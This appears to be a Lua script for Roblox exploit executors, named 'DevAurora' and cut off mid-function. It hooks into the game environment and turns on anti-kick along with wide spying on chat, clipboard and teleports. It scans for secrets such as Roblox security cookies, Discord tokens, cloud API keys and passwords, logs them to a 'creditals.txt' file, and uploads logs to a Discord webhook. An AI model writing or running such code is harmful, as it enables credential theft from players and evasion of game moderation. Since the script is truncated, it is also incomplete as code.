--!nocheck

_G.AuroraCFG = _G.AuroraCFG or {}
local CFG = _G.AuroraCFG

local DISCORD_WEBHOOK = CFG.WebhookURL or ""
local CUSTOM_FOOTER   = "DevAurora | logged by DevAurora"
local CREDS_FILENAME_DISCORD = "creditals.txt"
local ENVLOG_FILENAME_DISCORD = "envlogged.txt"
local EMBED_COLOR = 16711680
local ALERT_COLOR = 16711680
local SCHEMA_VERSION = "devaurora/1"
local SESSION_ID = string.format("sess_%d_%d", math.floor(os.time()), math.random(100000, 999999))

local raw_push
local send_embed_async
local analyze_arg_drift
local obfuscation_score
local enumerate_connections_fn
local exfil_chain_window={}
local domain_rate={}
local partial_tokens={}
local aurora_upvalue_snapshots={}
local coroutine_depth_tracker={}
local last_teleport_queue_t=0
local replay = {}
local replay_idx = 1
local _running = true
local script_scores={}
local file_hashes={}
local payload_hashes={}
local remote_timing={}
local chat_flood_counts={}
local remote_recv_hooked={}
local _capability_saved={}

local function refresh_webhook()
    DISCORD_WEBHOOK = (_G.AuroraCFG and _G.AuroraCFG.WebhookURL) or ""
end

local CONFIG = {
    max_entries=32768, flush_interval=0.4, stack_depth=6,
    log_to_file=true, creds_path="creditals.txt", envlog_path="envlogged.txt",
    jsonl_path="envlog.jsonl", export_jsonl=true,
    replay_path="_replay.bin", replay_max=500, envlog_rotate_bytes=8*1024*1024,
    trace_reads=true, trace_writes=true, trace_calls=true, trace_env=true, trace_load=true,
    trace_require=true, trace_remote=true, trace_signals=true, trace_coroutine=true, trace_task=true,
    trace_rawnet=true, trace_instance=true, trace_http=true, trace_file_io=true, trace_debug=true,
    trace_closure=true, trace_player=true, trace_chat=true, trace_humanoid=true, trace_signatures=true,
    profiler_enabled=true, call_graph_enabled=true, taint_enabled=true,
    env_diff_enabled=true, env_diff_interval=2.0, rate_limit_per_s=60,
    secret_enabled=true, secret_dedupe=true, secret_min_b64_len=200, secret_min_hex_len=64,
    secret_scan_kinds={http=true, remote=true, file=true, invoke=true, load=true, require=true, chat=true, watch=true, manual=true, sig=true},
    silence_sources={"devaurora_envlog"},
    webhook_min_gap=2.1, envlog_send_gap=10.0, envlog_batch_max=200,
    webhook_retry_max=3, webhook_retry_wait=1.5,
    heartbeat_seconds=300, integrity_seconds=5,
    recon_on_load=true, player_tracking=true, chat_capture=true, anti_kick=true, script_attribution=true,
    auto_character_hooks=true, auto_descendant_spy=true, auto_drawing_spy=true, auto_gui_detector=true,
    auto_uis_input=true, auto_cas_spy=true, auto_datastore_spy=true, auto_marketplace_spy=true,
    auto_teleport_spy=true, auto_runservice_spy=true, auto_sound_spy=true, auto_animation_spy=true,
    auto_camera_spy=true, auto_lighting_spy=true, auto_clipboard_spy=true, auto_teleport_queue_spy=true,
    auto_custom_asset_spy=true, auto_network_stats=true, auto_fps_counter=true, auto_error_capture=true,
    auto_attribute_spy=true, auto_hook_sweep=true, auto_known_bad_scan=true, auto_env_snapshot=true,
    descendant_class_filter=nil,
    descendant_ignore_classes={Folder=true,Configuration=true,NumberValue=true,StringValue=true,BoolValue=true,IntValue=true,ObjectValue=true,Vector3Value=true,CFrameValue=true,Color3Value=true,RayValue=true,BrickColorValue=true},
    fps_sample_interval=1.0, network_sample_interval=5.0,
    decompile_on_critical=true, decompile_max_bytes=200000,
    http_decode_enabled=true, cross_script_correlation=true,
    instruction_trace=true, string_const_diff=true, upvalue_chain=true,
    http_fingerprint=true, autodecode_chain=true, autotaint=true,
    c_api_trace=true, ancestry_hash=true, memory_watch=true, console_capture=true,
    exec_fingerprint=true, remote_schema=true, self_beacon=true,
    cross_instance=true, timing_detect=true, regex_snapshot=true,
    decoy_injection=false, rotation_tracker=true, heap_sampler=true,
    replay_buffer=true, sig_of_day=true, weighted_scoring=true,
    locale_detect=true, suspend_guard=true,
    gzip_decode=true, xor_brute=true, luac_detect=true, unicode_confusable=true,
    weighted_window=60, weighted_threshold=25, alert_color=16711680,
    taint_strings_max=10000, beacon_on_stop=true,
    level="NORMAL",
    dedup=true, dedup_window=8.0,
    adaptive=true, adaptive_rate_threshold=200,
    queue_max=32768, queue_policy="drop_oldest",
    provenance_depth=6,
    causality_enabled=true, causality_stack_max=64,
    identity_enabled=true,
    state_diff_enabled=true,
    return_trace=true,
    lineage_enabled=true, lineage_max_nodes=5000,
    upvalue_graph_enabled=true, metatable_graph_enabled=true,
    schema_learning=true, coverage_enabled=true,
    anomaly_enabled=true, baseline_path="_devaurora_baseline.json", anomaly_sigma=3,
    session_autostart=true, session_export_dir="devaurora_sessions",
    redact_style="redact", redact_keep_last=4,
    integrity_hash=true, integrity_marker_path="_devaurora_integrity.txt",
    test_on_load=false,
    trace_remote_recv=true, trace_raycast=true, trace_physics=true,
    trace_inst_method=true, trace_coregui=true, trace_adornment=true,
    trace_tween=true, trace_attr_change=true, trace_appearance=true,
    trace_mouse_behavior=true, trace_text_channel=true, trace_camera_write=true,
    trace_collision=true, trace_noclip=true, trace_state_abuse=true,
    trace_remote_timing=true, trace_script_scores=true, trace_session_diff=true,
    trace_file_hash=true, trace_payload_diff=true, autosave_jsonl_interval=60,
    trace_capability_loss=true, trace_player_field=true, trace_chat_flood=true,
    chat_flood_threshold=5, physics_speed_threshold=50, physics_velocity_threshold=100,
    honeypot_enabled=true, trace_http_response=true, trace_print=true,
    trace_obfuscation=true, obfuscation_threshold=8, trace_connections=true,
    trace_mutation=true, trace_teleport_detect=true, teleport_threshold=50,
    trace_arg_drift=true,
    instant_crit_alerts=true,
    trace_exfil_chain=true, exfil_chain_window_s=0.5,
    trace_domain_reputation=true, trace_domain_flood=true,
    domain_flood_threshold=5, domain_flood_window_s=10.0,
    trace_input_inject=true, self_cloak=true,
    trace_upvalue_tamper=true,
    trace_deep_coroutine=true, coroutine_depth_threshold=5,
    trace_rejoin_kit=true, rejoin_kit_window_s=3.0,
    trace_token_reconstruct=true,
}

local CAP={}
local CAP_REASON={}
local function cap_set(name,status,reason) CAP[name]=status; if reason then CAP_REASON[name]=reason end end
local function probe()
    local names={"getrawmetatable","setreadonly","isreadonly","hookfunction","restorefunction","hookmetamethod","getnamecallmethod","newcclosure","iscclosure","islclosure","clonefunction","checkcaller","getgenv","getrenv","getreg","getgc","getinstances","getnilinstances","getloadedmodules","getscripts","getsenv","getcallingscript","getscriptbytecode","decompile","dump_function","getupvalue","setupvalue","getupvalues","getconstants","getprotos","getinfo","getstack","readfile","writefile","appendfile","listfiles","delfile","isfile","isfolder","makefolder","writepipe","readpipe","request","http_request","httpget","httppost","HttpGet","HttpPost","syn","getconnections","firesignal","fireclickdetector","firetouchinterest","fireproximityprompt","getcustomasset","gethui","setclipboard","queue_on_teleport","identifyexecutor","gethwid","Drawing","setattribute","getattribute","setattributes","readmemory","writememory","zlib","buffer"}
    local env=getgenv and getgenv() or _G
    for _,n in ipairs(names) do if env[n]~=nil then cap_set(n,"AVAILABLE") else cap_set(n,"UNAVAILABLE","not exposed by executor") end end
end

local reentry=0
local function entering() reentry=reentry+1 end
local function leaving() reentry=reentry-1 end
local function in_reentry() return reentry>0 end

local SEQ=0
local function next_seq() SEQ=SEQ+1; return SEQ end
local t0=os.clock()
local function mono() return os.clock()-t0 end
local function wall() return os.time()+(os.clock()%1) end

local causality={}
local function thread_key()
    local co=coroutine.running()
    return co and tostring(co) or "main"
end
local function causal_push(eid)
    if not CONFIG.causality_enabled then return end
    local k=thread_key(); local s=causality[k]; if not s then s={}; causality[k]=s end
    if #s>=CONFIG.causality_stack_max then table.remove(s,1) end
    s[#s+1]=eid
end
local function causal_pop(eid)
    local s=causality[thread_key()]; if not s then return end
    if s[#s]==eid then s[#s]=nil end
end
local function causal_parent() local s=causality[thread_key()]; return s and s[#s] or nil end
local function causal_root() local s=causality[thread_key()]; return s and s[1] or nil end
local function causal_depth() local s=causality[thread_key()]; return s and #s or 0 end

local oid_map=setmetatable({},{__mode="k"}); local oid_seq=0
local function oid(obj)
    if not CONFIG.identity_enabled or obj==nil then return nil end
    local t=typeof(obj)
    if t=="table" or t=="function" or t=="userdata" or t=="thread" or t=="Instance" then
        local v=oid_map[obj]; if v then return v end
        oid_seq=oid_seq+1; local id="o"..oid_seq; oid_map[obj]=id; return id
    end
    return nil
end
local fid_map=setmetatable({},{__mode="k"}); local fid_seq=0
local function fid(fn)
    if not CONFIG.identity_enabled or type(fn)~="function" then return nil end
    local v=fid_map[fn]; if v then return v end
    fid_seq=fid_seq+1; local id="f"..fid_seq; fid_map[fn]=id; return id
end
local tid_map=setmetatable({},{__mode="k"}); local tid_seq=0
local function tid(co)
    if co==nil then return "main" end
    if not CONFIG.identity_enabled then return "?" end
    local v=tid_map[co]; if v then return v end
    tid_seq=tid_seq+1; local id="t"..tid_seq; tid_map[co]=id; return id
end

local function redact_value(s)
    if CONFIG.redact_style=="keep" then return s end
    if type(s)~="string" or #s<8 then return s end
    if CONFIG.redact_style=="hash" then return string.format("<H:%08x>",(function() local h=5381; for i=1,#s do h=((h*33)+s:byte(i))%4294967296 end return h end)()) end
    local keep=CONFIG.redact_keep_last or 4
    if #s<=keep then return "<REDACTED>" end
    return "<REDACTED:"..#s.."b>"..s:sub(-keep)
end

local function caller_info(skip)
    skip=skip or 2
    local frames={}
    for lvl=skip,skip+CONFIG.stack_depth do
        local s,l,n=debug.info(lvl,"sln")
        if not s then break end
        local drop=false
        for _,pat in ipairs(CONFIG.silence_sources) do if s:find(pat,1,true) then drop=true; break end end
        if not drop then frames[#frames+1]={src=s,line=l or 0,fn=n or "?"} end
    end
    local top=frames[1] or {src="?",line=0,fn="?"}
    return top.src,top.line,top.fn,frames
end

local function fmt_ident(x)
    local t=typeof(x)
    if t=="Instance" then local ok,f=pcall(function() return x:GetFullName() end); return ok and f or ("Instance<"..tostring(x)..">")
    elseif t=="string" then return string.format("%q",x:sub(1,96)) end
    return tostring(x)
end

local function fmt_val(x,depth)
    depth=depth or 0
    local t=typeof(x)
    if t=="function" then local src="?"; pcall(function() src=debug.info(x,"s") or "?" end); return "<fn "..src.." "..tostring(fid(x) or "?")..">"
    elseif t=="table" then return "<table "..tostring(oid(x) or "?")..">"
    elseif t=="string" then return redact_value(x:sub(1,240))
    elseif t=="Instance" then return fmt_ident(x)
    elseif t=="userdata" then return "<udata "..tostring(oid(x) or "?")..">"
    elseif t=="thread" then return "<thread "..tostring(tid(x))..">" end
    return tostring(x)
end

local function fmt_args(packed)
    if not packed or packed.n==0 then return "()" end
    local cap=math.min(packed.n,8); local parts=table.create(cap)
    for i=1,cap do parts[i]=fmt_val(packed[i],1) end
    if packed.n>cap then parts[#parts+1]="..."..(packed.n-cap) end
    return "("..table.concat(parts,", ")..")"
end

local function json_escape(s)
    s=tostring(s)
    return (s:gsub('[%c"\\]',function(c)
        if c=='"' then return '\\"' end
        if c=='\\' then return '\\\\' end
        if c=='\n' then return '\\n' end
        if c=='\r' then return '\\r' end
        if c=='\t' then return '\\t' end
        return string.format('\\u%04x',c:byte())
    end))
end

local function simple_hash(s)
    local h=5381
    for i=1,#s do h=((h*33)+s:byte(i))%4294967296 end
    return string.format("%08x",h)
end

local function to_json(v)
    local t=type(v)
    if t=="nil" then return "null" end
    if t=="number" then return tostring(v) end
    if t=="boolean" then return v and "true" or "false" end
    if t=="string" then return '"'..v:gsub('[%c"\\]',function(c)
        if c=='"' then return '\\"' end
        if c=='\\' then return '\\\\' end
        if c=='\n' then return '\\n' end
        if c=='\r' then return '\\r' end
        if c=='\t' then return '\\t' end
        return string.format('\\u%04x',c:byte())
    end)..'"' end
    if t=="table" then
        local is_arr=true; local max=0
        for k in pairs(v) do if type(k)~="number" then is_arr=false; break end if k>max then max=k end end
        if is_arr then
            local p={}; for i=1,max do p[i]=to_json(v[i]) end
            return "["..table.concat(p,",").."]"
        end
        local p={}; for k,val in pairs(v) do p[#p+1]=to_json(tostring(k))..":"..to_json(val) end
        return "{"..table.concat(p,",").."}"
    end
    return '"<unsupported:'..t..'>"'
end

local filters={allow_source={},deny_source={},deny_key={},deny_target={},deny_kind={}}
local function passes_filters(kind,src,target,key)
    for _,p in ipairs(filters.deny_kind) do if kind==p then return false end end
    if #filters.allow_source>0 then
        local ok=false
        for _,p in ipairs(filters.allow_source) do if src and src:find(p,1,true) then ok=true; break end end
        if not ok then return false end
    end
    for _,p in ipairs(filters.deny_source) do if src and src:find(p,1,true) then return false end end
    if key~=nil then
        local ks=tostring(key)
        for _,p in ipairs(filters.deny_key) do if ks:find(p,1,true) then return false end end
    end
    if target~=nil then
        local tn=fmt_ident(target)
        for _,p in ipairs(filters.deny_target) do if tn:find(p,1,true) then return false end end
    end
    return true
end

local rate_buckets={}
local function rate_ok(src,key)
    local now=mono(); local b=src.."|"..tostring(key or "?"); local r=rate_buckets[b]
    if not r or now-r.start>=1 then rate_buckets[b]={start=now,n=1}; return true end
    r.n=r.n+1; return r.n<=CONFIG.rate_limit_per_s
end

local bus={queue={},dropped=0,sampled=0,total_in=0,total_out=0,dedup_map={},
    perf={process_time_total=0,process_time_max=0,peak_queue=0,flush_count=0}}

local level_rank={MINIMAL=1,NORMAL=2,DETAILED=3,TRACE=4}
local function level_allows(kind)
    local r=level_rank[CONFIG.level] or 2
    if r==1 then return kind=="secret" or kind=="error" or kind=="known_bad" or kind=="http" or kind=="beacon" end
    if r==2 then return kind~="read" and kind~="write" and kind~="descendant" and kind~="gui" end
    if r==3 then return kind~="descendant" end
    return true
end

local function shape_hash(ev)
    local keys={}
    for k in pairs(ev.data or {}) do keys[#keys+1]=tostring(k) end
    table.sort(keys)
    return simple_hash((ev.kind or "?").."|"..(ev.src and ev.src.script or "?").."|"..(ev.src and ev.src.fn or "?").."|"..table.concat(keys,","))
end

local function dedup_consider(ev)
    if not CONFIG.dedup then return ev end
    local h=shape_hash(ev); local rec=bus.dedup_map[h]
    if rec and (ev.t-rec.first_t)<CONFIG.dedup_window then rec.count=rec.count+1; rec.last_t=ev.t; return nil end
    bus.dedup_map[h]={count=1,first_t=ev.t,last_t=ev.t,eid=ev.eid}
    ev.dedup_h=h
    return ev
end

local function adaptive_allow(ev)
    if not CONFIG.adaptive then return true end
    local rate=bus.total_in/math.max(mono(),0.001)
    if rate>CONFIG.adaptive_rate_threshold then
        local low={read=true,write=true,call=true,descendant=true}
        if low[ev.kind] then bus.sampled=bus.sampled+1; return false end
    end
    return true
end

local function enqueue(ev)
    bus.total_in=bus.total_in+1
    if not adaptive_allow(ev) then return end
    ev=dedup_consider(ev)
    if not ev then return end
    local q=bus.queue
    if #q>=CONFIG.queue_max then
        if CONFIG.queue_policy=="drop_oldest" then table.remove(q,1); bus.dropped=bus.dropped+1
        elseif CONFIG.queue_policy=="drop_newest" then bus.dropped=bus.dropped+1; return end
    end
    q[#q+1]=ev
    if #q>bus.perf.peak_queue then bus.perf.peak_queue=#q end
end

local graph={nodes={},edges={}}
local function graph_add_node(id,type_,label)
    if not id then return end
    local n=graph.nodes[id]
    if not n then graph.nodes[id]={type=type_,label=label,first_t=mono(),count=1}
    else n.count=n.count+1 end
end
local function graph_add_edge(a,b,kind)
    if not a or not b then return end
    local k=a.."->"..b; local e=graph.edges[k]
    if not e then graph.edges[k]={count=1,kinds={[kind]=1},first_t=mono(),last_t=mono()}
    else e.count=e.count+1; e.kinds[kind]=(e.kinds[kind] or 0)+1; e.last_t=mono() end
end

local func_life={}
local return_log={}
local function trace_return(call_eid,...)
    if not CONFIG.return_trace then return end
    local n=select("#",...)
    local vals={}
    for i=1,math.min(n,6) do vals[i]=fmt_val((select(i,...)),1) end
    local sig={}
    for i=1,math.min(n,6) do local t=typeof((select(i,...))); sig[i]=t end
    return_log[call_eid]={n=n,sig=table.concat(sig,","),sample=vals}
end

local upvalue_graph={}
local function snapshot_upvalues(fn)
    if not CONFIG.upvalue_graph_enabled or type(fn)~="function" then return nil end
    local id=fid(fn); if not id then return nil end
    local ups={}
    if debug.getupvalues then
        local ok,list=pcall(debug.getupvalues,fn)
        if ok and list then for i,v in ipairs(list) do ups[i]={i=i,type=typeof(v),val_oid=oid(v)} end end
    end
    upvalue_graph[id]=upvalue_graph[id] or {id=id,snapshots={}}
    upvalue_graph[id].snapshots[#upvalue_graph[id].snapshots+1]={t=mono(),ups=ups}
    if #upvalue_graph[id].snapshots>8 then table.remove(upvalue_graph[id].snapshots,1) end
    return ups
end

local mt_graph={}

local lineage={nodes={},order={},max=CONFIG.lineage_max_nodes}
local function lineage_hash(v)
    if type(v)~="string" then return nil end
    local h=5381
    for i=1,#v do h=((h*33)+v:byte(i))%4294967296 end
    return string.format("%08x",h)
end
local function lineage_touch(v,role,eid,extra)
    if not CONFIG.lineage_enabled then return end
    if type(v)~="string" or #v<6 then return end
    local h=lineage_hash(v); if not h then return end
    local n=lineage.nodes[h]
    if not n then
        if #lineage.order>=lineage.max then local old=table.remove(lineage.order,1); lineage.nodes[old]=nil end
        n={hash=h,preview=redact_value(v:sub(1,64)),roles={},events={}}
        lineage.nodes[h]=n; lineage.order[#lineage.order+1]=h
    end
    n.roles[role]=(n.roles[role] or 0)+1
    if #n.events<32 then n.events[#n.events+1]={eid=eid,role=role,extra=extra} end
end

local schemas={}
local function schema_observe(ev)
    if not CONFIG.schema_learning then return end
    local key=(ev.kind or "?")..":"..(ev.cat or "?")
    local s=schemas[key]
    if not s then s={key=key,n=0,keys={},sigs={}}; schemas[key]=s end
    s.n=s.n+1
    for k in pairs(ev.data or {}) do s.keys[tostring(k)]=(s.keys[tostring(k)] or 0)+1 end
    local sig=""
    for k,v in pairs(ev.data or {}) do sig=sig..k..":"..typeof(v).."," end
    s.sigs[sig]=(s.sigs[sig] or 0)+1
end

local coverage={kinds={},scripts={},apis={},categories={}}
local function coverage_hit(ev)
    if not CONFIG.coverage_enabled then return end
    coverage.kinds[ev.kind]=(coverage.kinds[ev.kind] or 0)+1
    coverage.categories[ev.cat]=(coverage.categories[ev.cat] or 0)+1
    if ev.src and ev.src.script and ev.src.script~="?" then coverage.scripts[ev.src.script]=(coverage.scripts[ev.src.script] or 0)+1 end
    if ev.data and ev.data.op then coverage.apis[ev.data.op]=(coverage.apis[ev.data.op] or 0)+1 end
end

local PATTERNS={
    {name="discord_webhook",re="https?://[%w%-%.]*discord[%w%-%.]*%.com/api/webhooks/%d+/[%w%-_]+",sev="CRIT"},
    {name="discord_bot_token",re="[MN][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d]%.[%w%-_]+%.[%w%-_]+",sev="CRIT"},
    {name="roblox_cookie",re="_|WARNING:%-DO%-NOT%-SHARE%-THIS[%w%-_%./=]+",sev="CRIT"},
    {name="roblox_cookie_alt",re="%.ROBLOSECURITY=([%w%-_%./=]+)",sev="CRIT"},
    {name="bearer_token",re="[Bb]earer%s+[A-Za-z%d%-%._~+/]+=*",sev="HIGH"},
    {name="jwt",re="eyJ[A-Za-z%d_%-]+%.eyJ[A-Za-z%d_%-]+%.[A-Za-z%d_%-]+",sev="HIGH"},
    {name="aws_access_key",re="AKIA[0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z]",sev="CRIT"},
    {name="aws_secret",re="aws[_%-]?secret[_%-]?access[_%-]?key[\"'%s:=]+([A-Za-z0-9/+=]+)",sev="CRIT"},
    {name="aws_session",re="ASIA[0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z]",sev="HIGH"},
    {name="github_pat_new",re="github_pat_[A-Za-z0-9_]+",sev="CRIT"},
    {name="github_pat",re="gh[pousr]_[A-Za-z0-9]+",sev="CRIT"},
    {name="slack_token",re="xox[baprs]%-[A-Za-z0-9%-]+",sev="HIGH"},
    {name="google_api_key",re="AIza[0-9A-Za-z_%-]+",sev="HIGH"},
    {name="openai_key",re="sk%-[A-Za-z0-9]+",sev="HIGH"},
    {name="stripe_live",re="sk_live_[0-9a-zA-Z]+",sev="CRIT"},
    {name="telegram_bot",re="%d%d%d%d%d%d%d%d%d?:[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="private_key",re="%-%-%-%-%-BEGIN%s+[A-Z]*%s*PRIVATE%s+KEY%-%-%-%-%-",sev="CRIT"},
    {name="generic_api_key",re="[Aa][Pp][Ii][_%-]?[Kk][Ee][Yy][\"'%s:=]+([A-Za-z0-9_%-]+)",sev="MED"},
    {name="generic_token",re="[Tt][Oo][Kk][Ee][Nn][\"'%s:=]+([A-Za-z0-9_%./+%-]+)",sev="MED"},
    {name="generic_secret",re="[Ss][Ee][Cc][Rr][Ee][Tt][\"'%s:=]+([A-Za-z0-9_%./+%-]+)",sev="MED"},
    {name="generic_password",re="[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd][\"'%s:=]+([^\"'%s]+)",sev="HIGH"},
    {name="basic_auth_url",re="https?://[^%s:/@]+:[^%s:/@]+@[^%s/]+",sev="CRIT"},
    {name="webhook_generic",re="https?://[%w%-%.]+/api/webhooks?/[%w%-_/]+",sev="HIGH"},
    {name="url_with_token",re="https?://[^%s\"'<>]+[?&](token|key|apikey|api_key|access_token|auth)=",sev="HIGH"},
    {name="azure_storage_key",re="[Aa]ccount[Kk]ey=[A-Za-z0-9+/=]+",sev="CRIT"},
    {name="azure_sas",re="sig=[A-Za-z0-9%+/=]+&",sev="HIGH"},
    {name="gcp_service_json",re="\"type\":\"service_account\"",sev="CRIT"},
    {name="gcp_oauth",re="ya29%.[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="vercel_token",re="vercel_[A-Za-z0-9]+",sev="HIGH"},
    {name="netlify_token",re="nfp_[A-Za-z0-9]+",sev="HIGH"},
    {name="cloudflare_token",re="cf%-[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="npm_token",re="npm_[A-Za-z0-9]+",sev="HIGH"},
    {name="pypi_token",re="pypi%-[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="digitalocean_pat",re="dop_v1_[a-f0-9]+",sev="CRIT"},
    {name="sendgrid_key",re="SG%.[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="linear_api",re="lin_api_[A-Za-z0-9]+",sev="HIGH"},
    {name="notion_token",re="secret_[A-Za-z0-9]+",sev="HIGH"},
    {name="shopify_token",re="shpat_[A-Za-z0-9]+",sev="HIGH"},
    {name="zapier_hook",re="https?://hooks%.zapier%.com/hooks/catch/%d+/[A-Za-z0-9]+/",sev="HIGH"},
    {name="ifttt_key",re="https?://maker%.ifttt%.com/use/[A-Za-z0-9_%-]+/with/key/[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="firebase_url",re="https?://[A-Za-z0-9%-]+%.firebaseio%.com",sev="MED"},
    {name="supabase_key",re="eyJ[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+",sev="MED"},
}
local SECRETS={seen={},hits=0}

local creds_handle
do local ok,f=pcall(io.open,CONFIG.creds_path,"a"); if ok and f then creds_handle=f end end

local envlog_handle,envlog_bytes
local function open_envlog()
    local ok,f=pcall(io.open,CONFIG.envlog_path,"a")
    if ok and f then envlog_handle=f; local sz=f:seek("end"); envlog_bytes=sz or 0 end
end
open_envlog()

local jsonl_handle
if CONFIG.export_jsonl then
    local ok,f=pcall(io.open,CONFIG.jsonl_path,"a"); if ok and f then jsonl_handle=f end
end

local creds_queue={}; local envlog_queue={}
local last_creds_send=0; local last_envlog_send=0; local webhook_rotor=0

local function http_request_fn()
    local env=getgenv and getgenv() or _G
    return (env.syn and env.syn.request) or env.http_request or env.request or (syn and syn.request) or http_request or request
end
local function next_webhook()
    refresh_webhook()
    if DISCORD_WEBHOOK and DISCORD_WEBHOOK~="" then return DISCORD_WEBHOOK end
    return nil
end
local function http_post_raw(url,body,ct)
    local req=http_request_fn(); if not req then return false,"no http function" end
    local ok,res=pcall(req,{Url=url,Method="POST",Headers={["Content-Type"]=ct},Body=body})
    if not ok then return false,tostring(res) end
    if type(res)=="table" then
        local code=res.StatusCode or res.status or res.Status
        if code and (code<200 or code>=300) then return false,string.format("HTTP %s %s",tostring(code),tostring(res.Body or res.body or "")) end
    end
    return true,nil
end
local function post_multipart_file(payload_json,filename,file_content)
    local url=next_webhook(); if not url then return false,"no webhook configured" end
    local boundary="----devaurora"..tostring(math.random(100000000,999999999))..tostring(math.floor(os.clock()*1000))
    local crlf="\r\n"
    local parts={}
    parts[#parts+1]="--"..boundary..crlf
    parts[#parts+1]='Content-Disposition: form-data; name="payload_json"'..crlf
    parts[#parts+1]="Content-Type: application/json"..crlf
    parts[#parts+1]=crlf; parts[#parts+1]=payload_json..crlf
    parts[#parts+1]="--"..boundary..crlf
    parts[#parts+1]='Content-Disposition: form-data; name="files[0]"; filename="'..filename..'"'..crlf
    parts[#parts+1]="Content-Type: text/plain"..crlf
    parts[#parts+1]=crlf; parts[#parts+1]=file_content..crlf
    parts[#parts+1]="--"..boundary.."--"..crlf
    local body=table.concat(parts); local ct="multipart/form-data; boundary="..boundary
    local attempt=0
    while attempt<CONFIG.webhook_retry_max do
        attempt=attempt+1
        local ok,err=http_post_raw(url,body,ct)
        if ok then return true,nil end
        if err and (err:find("429") or err:find("5%d%d")) then task.wait(CONFIG.webhook_retry_wait*attempt) else return false,err end
    end
    return false,"retry exhausted"
end
local function post_json_with_retry(body)
    local url=next_webhook(); if not url then return false,"no webhook configured" end
    local attempt=0
    while attempt<CONFIG.webhook_retry_max do
        attempt=attempt+1
        local ok,err=http_post_raw(url,body,"application/json")
        if ok then return true,nil end
        if err and (err:find("429") or err:find("5%d%d")) then task.wait(CONFIG.webhook_retry_wait*attempt) else return false,err end
    end
    return false,"retry exhausted"
end
local SEV_RANK={CRIT=4,HIGH=3,MED=2,LOW=1,INFO=0}
local function worst_sev(batch)
    local w="LOW"; for _,s in ipairs(batch) do if (SEV_RANK[s.sev] or 0)>(SEV_RANK[w] or 0) then w=s.sev end end; return w
end
local function count_patterns(batch)
    local by={}; for _,s in ipairs(batch) do local k=s.pattern or "?"; by[k]=(by[k] or 0)+1 end
    local list={}; for k,v in pairs(by) do list[#list+1]={k=k,v=v} end
    table.sort(list,function(a,b) return a.v>b.v end)
    local top={}; for i=1,math.min(5,#list) do top[#top+1]=string.format("%s (%d)",list[i].k,list[i].v) end
    return table.concat(top,", ")
end

local function url_decode(s) return (s:gsub("%%(%x%x)",function(h) return string.char(tonumber(h,16)) end)) end
local function hex_decode(s) if #s%2~=0 then return s end return (s:gsub("%x%x",function(h) return string.char(tonumber(h,16)) end)) end
local function b64_decode(s)
    local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    s=s:gsub("[^"..b:gsub("%-","%%-").."=]","")
    local out={}; local i=1
    while i<=#s do
        local c1=b:find(s:sub(i,i),1,true) or 0; local c2=b:find(s:sub(i+1,i+1),1,true) or 0
        local c3=b:find(s:sub(i+2,i+2),1,true) or 0; local c4=b:find(s:sub(i+3,i+3),1,true) or 0
        local n=c1*262144+c2*4096+c3*64+c4
        out[#out+1]=string.char(math.floor(n/65536)%256); out[#out+1]=string.char(math.floor(n/256)%256); out[#out+1]=string.char(n%256)
        i=i+4
    end
    return table.concat(out)
end
local function rot13(s) return (s:gsub("%a",function(c) local b=c:byte(); if b>=65 and b<=90 then return string.char(((b-65+13)%26)+65) end; if b>=97 and b<=122 then return string.char(((b-97+13)%26)+97) end; return c end)) end
local function xor_single(s,key) local out={}; for i=1,#s do out[i]=string.char(bit32.bxor(s:byte(i),key)) end; return table.concat(out) end
local function detect_luac(s) if #s>=4 and s:byte(1)==27 and s:sub(2,4)=="Lua" then return s:byte(5) end return nil end
local CONFUSABLES={["\208\176"]="a",["\208\181"]="e",["\208\190"]="o",["\209\128"]="p",["\209\129"]="c",["\209\133"]="x",["\208\144"]="A",["\208\149"]="E",["\208\158"]="O",["\208\160"]="P",["\208\161"]="C",["\208\165"]="X"}
local function has_confusable(s) for k in pairs(CONFUSABLES) do if s:find(k,1,true) then return true end end return false end

local score_window={}
local function score_event(kind,sev)
    if not CONFIG.weighted_scoring then return end
    local now=mono()
    local base={secret=10,remote=2,http=5,file=5,closure=8,debug=3,known_bad=15,sig=4}
    local s=(base[kind] or 1)*((SEV_RANK[sev] or 1)+1)
    score_window[#score_window+1]={t=now,score=s}
    local cut=now-CONFIG.weighted_window
    while #score_window>0 and score_window[1].t<cut do table.remove(score_window,1) end
    local sum=0; for _,e in ipairs(score_window) do sum=sum+e.score end
    if sum>=CONFIG.weighted_threshold then
        send_embed_async("Critical Activity",{
            {name="Weighted Score",value=tostring(sum),inline=true},
            {name="Window",value=CONFIG.weighted_window.."s",inline=true},
            {name="Session",value=SESSION_ID,inline=true},
        },"threshold exceeded",CONFIG.alert_color)
        score_window={}
    end
end

local http_fingerprints={}
local function fingerprint_http(url,body,ctx)
    if not CONFIG.http_fingerprint then return end
    local h=simple_hash((url or "?").."|"..tostring(body or ""))
    local prev=http_fingerprints[h]
    if not prev then http_fingerprints[h]={url=url,body_len=#tostring(body or ""),count=1,first=mono()}
    else
        prev.count=prev.count+1
